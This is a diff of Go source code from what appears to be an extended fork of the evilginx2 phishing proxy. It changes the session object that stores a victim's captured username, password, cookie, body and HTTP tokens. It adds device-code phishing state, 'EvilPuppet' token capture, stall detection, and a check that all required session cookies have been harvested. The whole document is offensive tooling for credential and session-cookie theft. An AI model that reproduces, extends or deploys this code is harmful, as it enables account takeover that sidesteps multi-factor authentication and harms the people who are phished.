@@ -1,94 +1,129 @@
 package core
 
 import (
-	"net/http"
+	"strings"
+	"time"
 
 	"github.com/kgretzky/evilginx2/database"
 )
 
 type Session struct {
-	Id            string
-	Name          string
-	Username      string
-	Password      string
-	Custom        map[string]string
-	Params        map[string]string
-	Tokens        map[string]map[string]*database.Token
-	RedirectURL   string
-	IsDone        bool
-	IsAuthUrl     bool
-	IsForwarded   bool
-	RedirectCount int
-	PhishLure     *Lure
-	ProxyURL      string
+	Id                string
+	Name              string
+	Username          string
+	Password          string
+	Custom            map[string]string
+	Params            map[string]string
+	BodyTokens        map[string]string
+	HttpTokens        map[string]string
+	CookieTokens      map[string]map[string]*database.CookieToken
+	RedirectURL       string
+	IsDone            bool
+	IsAuthUrl         bool
+	IsForwarded       bool
+	ProgressIndex     int
+	RedirectCount     int
+	PhishLure         *Lure
+	RedirectorName    string
+	LureDirPath       string
+	DoneSignal        chan struct{}
+	RemoteAddr        string
+	UserAgent         string
+	LureLanded        bool
+	Phishlet          string
+	EvilPuppetTokens  map[string]string
+	DCSessionID       string    // Linked device code session ID
+	DCUserCode        string    // Device code user code for display
+	DCMode            string    // Device code mode for this session
+	DCState           string    // Current device code state
+	LastTokenActivity time.Time // Timestamp of last auth token capture (for stall detection)
+	StallDetected     bool      // Whether a session stall was detected
 }
 
-func NewSession(name string) (*Session, error) {
+func NewSession(name string, cfg *Config) (*Session, error) {
 	s := &Session{
-		Id:            GenRandomToken(),
-		Name:          name,
-		Username:      "",
-		Password:      "",
-		Custom:        make(map[string]string),
-		Params:        make(map[string]string),
-		RedirectURL:   "",
-		IsDone:        false,
-		IsAuthUrl:     false,
-		IsForwarded:   false,
-		RedirectCount: 0,
-		PhishLure:     nil,
-		ProxyURL:      "",
+		Id:                GenRandomToken(),
+		Name:              name,
+		Username:          "",
+		Password:          "",
+		Custom:            make(map[string]string),
+		Params:            make(map[string]string),
+		BodyTokens:        make(map[string]string),
+		HttpTokens:        make(map[string]string),
+		RedirectURL:       "",
+		IsDone:            false,
+		IsAuthUrl:         false,
+		IsForwarded:       false,
+		ProgressIndex:     0,
+		RedirectCount:     0,
+		PhishLure:         nil,
+		RedirectorName:    "",
+		LureDirPath:       "",
+		DoneSignal:        make(chan struct{}),
+		RemoteAddr:        "",
+		UserAgent:         "",
+		LureLanded:        false,
+		Phishlet:          name,
+		EvilPuppetTokens:  make(map[string]string),
+		DCSessionID:       "",
+		DCUserCode:        "",
+		DCMode:            DCModeAlways,
+		DCState:           "",
+		LastTokenActivity: time.Now(),
+		StallDetected:     false,
 	}
-	s.Tokens = make(map[string]map[string]*database.Token)
+	s.CookieTokens = make(map[string]map[string]*database.CookieToken)
 
 	return s, nil
 }
 
 func (s *Session) SetUsername(username string) {
-	s.Username = username
+	s.Username = strings.TrimRight(username, "=")
 }
 
 func (s *Session) SetPassword(password string) {
 	s.Password = password
 }
 
-func (s *Session) SetCustom(name, value string) {
+func (s *Session) SetCustom(name string, value string) {
 	s.Custom[name] = value
 }
 
-func (s *Session) AddAuthToken(domain, key, value, path string, http_only bool, secure bool, same_site http.SameSite, authTokens map[string][]*AuthToken) bool {
-	if _, ok := s.Tokens[domain]; !ok {
-		s.Tokens[domain] = make(map[string]*database.Token)
+func (s *Session) AddCookieAuthToken(domain string, key string, value string, path string, http_only bool, expires time.Time) {
+	if _, ok := s.CookieTokens[domain]; !ok {
+		s.CookieTokens[domain] = make(map[string]*database.CookieToken)
 	}
-	if tk, ok := s.Tokens[domain][key]; ok {
+
+	if tk, ok := s.CookieTokens[domain][key]; ok {
 		tk.Name = key
 		tk.Value = value
 		tk.Path = path
 		tk.HttpOnly = http_only
-		tk.Secure = secure
-		tk.SameSite = same_site
 	} else {
-		s.Tokens[domain][key] = &database.Token{
+		s.CookieTokens[domain][key] = &database.CookieToken{
 			Name:     key,
 			Value:    value,
 			Path:     path,
 			HttpOnly: http_only,
-			Secure:   secure,
-			SameSite: same_site,
 		}
 	}
+}
 
-	tcopy := make(map[string][]AuthToken)
+func (s *Session) AllCookieAuthTokensCaptured(authTokens map[string][]*CookieAuthToken) bool {
+	tcopy := make(map[string][]CookieAuthToken)
 	for k, v := range authTokens {
-		tcopy[k] = []AuthToken{}
+		var required []CookieAuthToken
 		for _, at := range v {
 			if !at.optional {
-				tcopy[k] = append(tcopy[k], *at)
+				required = append(required, *at)
 			}
+		}
+		if len(required) > 0 {
+			tcopy[k] = required
 		}
 	}
 
-	for domain, tokens := range s.Tokens {
+	for domain, tokens := range s.CookieTokens {
 		for tk := range tokens {
 			if al, ok := tcopy[domain]; ok {
 				for an, at := range al {
@@ -110,5 +145,19 @@ func (s *Session) AddAuthToken(domain, key, value, path string, http_only bool, 
 		}
 	}
 
-	return len(tcopy) == 0
+	if len(tcopy) == 0 {
+		return true
+	}
+	return false
+}
+
+func (s *Session) Finish(is_auth_url bool) {
+	if !s.IsDone {
+		s.IsDone = true
+		s.IsAuthUrl = is_auth_url
+		if s.DoneSignal != nil {
+			close(s.DoneSignal)
+			s.DoneSignal = nil
+		}
+	}
 }
